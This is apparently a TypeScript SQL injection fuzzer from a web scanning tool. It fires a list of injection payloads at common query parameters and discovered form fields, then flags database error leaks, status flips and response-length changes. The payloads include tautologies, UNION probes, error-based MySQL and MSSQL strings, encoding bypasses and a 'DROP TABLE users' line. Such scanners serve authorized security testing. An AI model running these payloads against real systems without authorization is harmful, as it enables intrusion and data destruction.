// SQL Injection fuzzer — sends a battery of payloads against common query
// string parameters and any HTML form inputs discovered on the page, then
// classifies responses against known DB error signatures and behavioural
// differences (status flips, length deltas).

export interface SqliFinding {
  route: string;
  url: string;
  parameter: string;
  payload: string;
  method: "GET" | "POST";
  status: number;
  severity: "info" | "low" | "medium" | "high";
  vulnerable: boolean;
  signal: string;
}

export const SQLI_PAYLOADS = [
  "'",
  "\"",
  "\\",
  "' OR '1'='1",
  "' OR '1'='1' --",
  "\" OR \"1\"=\"1\" --",
  "') OR ('1'='1",
  "')) OR 1=1--",
  "1 OR 1=1",
  "1; DROP TABLE users--",
  "'; SELECT pg_sleep(0)--",
  "' UNION SELECT NULL--",
  "' UNION SELECT NULL,NULL,NULL--",
  "admin'--",
  "admin' #",
  "%27%20OR%201%3D1--",            // URL-encoded
  "%2527%2520OR%25201%253D1--",    // Double-encoded
  "0/**/OR/**/1=1",                 // Comment-bypass
  "1' AND SLEEP(0)--",              // Time-based marker
  "' AND extractvalue(1,concat(0x7e,version()))--", // MySQL error-based
  "' AND 1=CONVERT(int,@@version)--",                // MSSQL error-based
  "' || (SELECT '') || '",          // Oracle concat
];

export const COMMON_PARAMS = [
  "id", "q", "search", "query", "name", "user", "email", "page",
  "category", "slug", "ref", "lang", "order", "sort", "filter",
  "uid", "pid", "sid", "token", "callback", "redirect", "next",
];

const ERROR_SIGNATURES: Array<[RegExp, string]> = [
  [/sql syntax|syntax error at or near|unterminated quoted/i, "Generic SQL syntax error"],
  [/sqlstate\[/i, "PDO SQLSTATE leak"],
  [/pg_query|psycopg2|postgresql/i, "PostgreSQL error leak"],
  [/mysql_fetch|mysqli_|you have an error in your sql/i, "MySQL error leak"],
  [/ora-\d{5}/i, "Oracle ORA-* error leak"],
  [/sqlite_error|sqlite3\./i, "SQLite error leak"],
  [/odbc|microsoft.*odbc/i, "ODBC error leak"],
  [/supabase.*(error|exception)/i, "Supabase error leak"],
];

function detectSignature(text: string): string | null {
  for (const [re, name] of ERROR_SIGNATURES) if (re.test(text)) return name;
  return null;
}

async function safeFetch(
  url: string,
  init?: RequestInit
): Promise<{ res: Response; text: string } | null> {
  try {
    const res = await fetch(url, { ...init, credentials: "omit", mode: "cors" });
    const text = await res.text();
    return { res, text };
  } catch {
    return null;
  }
}

function extractFormInputs(html: string): Array<{
  action: string | null;
  method: "GET" | "POST";
  fields: string[];
}> {
  const forms: Array<{ action: string | null; method: "GET" | "POST"; fields: string[] }> = [];
  for (const m of html.matchAll(/<form\b([^>]*)>([\s\S]*?)<\/form>/gi)) {
    const attrs = m[1];
    const body = m[2];
    const method = (/method=["']?(post|put|patch|delete)["']?/i.test(attrs) ? "POST" : "GET") as
      | "GET"
      | "POST";
    const action = /action=["']([^"']*)["']/i.exec(attrs)?.[1] || null;
    const fields = Array.from(body.matchAll(/<(?:input|textarea|select)\b[^>]*name=["']([^"']+)["']/gi))
      .map((f) => f[1])
      .filter((n) => !/csrf|token|password/i.test(n));
    if (fields.length > 0) forms.push({ action, method, fields });
  }
  return forms;
}

export async function runSqliFuzz(
  baseUrl: string,
  routes: string[],
  opts?: {
    extraParams?: string[];
    onProgress?: (msg: string) => void;
    payloads?: string[];
  }
): Promise<SqliFinding[]> {
  const out: SqliFinding[] = [];
  const log = (m: string) => opts?.onProgress?.(m);
  const params = Array.from(new Set([...(opts?.extraParams || []), ...COMMON_PARAMS]));
  const payloads = opts?.payloads || SQLI_PAYLOADS;
  const base = baseUrl.replace(/\/$/, "");

  for (const route of routes) {
    const pageUrl = base + route;
    log(`Fuzzing ${route} (baseline)…`);

    // Baseline
    const baseline = await safeFetch(pageUrl);
    const baseLen = baseline?.text.length || 0;
    const baseStatus = baseline?.res.status || 0;

    // Discover form fields on the page
    const discoveredForms = baseline ? extractFormInputs(baseline.text) : [];

    // ---- GET fuzzing on common params ----
    for (const p of params) {
      for (const payload of payloads) {
        const probe = `${pageUrl}${pageUrl.includes("?") ? "&" : "?"}${p}=${encodeURIComponent(
          payload
        )}`;
        const r = await safeFetch(probe);
        if (!r) continue;
        const sig = detectSignature(r.text);
        const lenDelta = Math.abs(r.text.length - baseLen);
        const statusFlip = baseStatus !== r.res.status && r.res.status >= 500;
        const vulnerable = !!sig || statusFlip;
        if (vulnerable || lenDelta > 2000) {
          out.push({
            route,
            url: probe,
            parameter: p,
            payload,
            method: "GET",
            status: r.res.status,
            vulnerable,
            severity: sig ? "high" : statusFlip ? "medium" : "low",
            signal:
              sig ||
              (statusFlip
                ? `Status flipped ${baseStatus} → ${r.res.status}`
                : `Length delta ${lenDelta} bytes`),
          });
        }
      }
    }

    // ---- POST fuzzing on discovered form fields ----
    for (const form of discoveredForms) {
      const action = form.action
        ? new URL(form.action, pageUrl).href
        : pageUrl;
      for (const field of form.fields) {
        for (const payload of payloads.slice(0, 4)) {
          const fd = new FormData();
          fd.append(field, payload);
          const r = await safeFetch(action, { method: form.method, body: fd });
          if (!r) continue;
          const sig = detectSignature(r.text);
          if (sig) {
            out.push({
              route,
              url: action,
              parameter: field,
              payload,
              method: form.method,
              status: r.res.status,
              vulnerable: true,
              severity: "high",
              signal: sig,
            });
          }
        }
      }
    }
  }

  return out;
}
